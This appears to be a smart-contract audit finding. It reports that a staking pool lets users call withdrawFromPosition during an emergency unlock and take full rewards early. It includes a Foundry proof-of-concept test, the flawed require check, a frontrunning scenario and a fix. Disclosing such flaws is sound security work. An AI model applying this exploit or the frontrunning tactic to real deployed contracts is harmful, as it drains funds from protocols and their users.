# During Emergency Unlock, User can call withdrawFromPosition to make premature withdrawals and get full rewards.

## Impact
Contract loses reward tokens unfairly and user can gain reward tokens without waiting the necessary lock duration

## Code Snippet
```solidity
function testGainRewardsBeforeDurationPasses() public {
        _stakingToken.mint(ALICE, 1 ether);

        vm.startPrank(ALICE);
        _stakingToken.approve(address(_pool), 1 ether);
        _pool.createPosition(1 ether, 1 days);
        vm.stopPrank();

        _rewardToken.mint(address(_pool), 100_000_000);

        console.log(_pool.pendingRewards(1));
        //99999999; should be unlocked after lock duration passes

        //Contract is put into emergency mode and all withdrawals are unlocked
        vm.prank(DEV);
        _pool.setEmergencyUnlock(true);

        // alice withdraws her position
        vm.prank(ALICE);
        // _pool.harvestPosition(1);
        _pool.withdrawFromPosition(1, 1 ether);

        //returns 99999999
        console.log(_rewardToken.balanceOf(ALICE));

    }
```
In the above POC it is demonstrated that users can gain reward tokens before their lock duration elapses in the event of an emergency unlock. The protol incorrectly assumes that the users will call the _emergencyWithdraw function during and emergency which would mean their position gets closed and they get no rewards. 
However, users can call the withdrawFromPosition (or harvestPosition) and close their position prematurely and also get rewards.

```solidity
require(
            _unlockOperators.contains(nftOwner)
                || (position.startLockTime + position.lockDuration) <= _currentBlockTimestamp() || isUnlocked(),
            "locked"
        );
```
The isUnlocked check above allows the call to go through during emergency unlocks

A malicious user could also intentionally frontrun the owners call to put the contract into emergency mode with a stakingToken deposit and then withdraw the deposited amount + rewards in the next block.

## Recommendation
Consider restricting the withdrawFromPosition and harvestPosition functons from being called during emergency unlocks
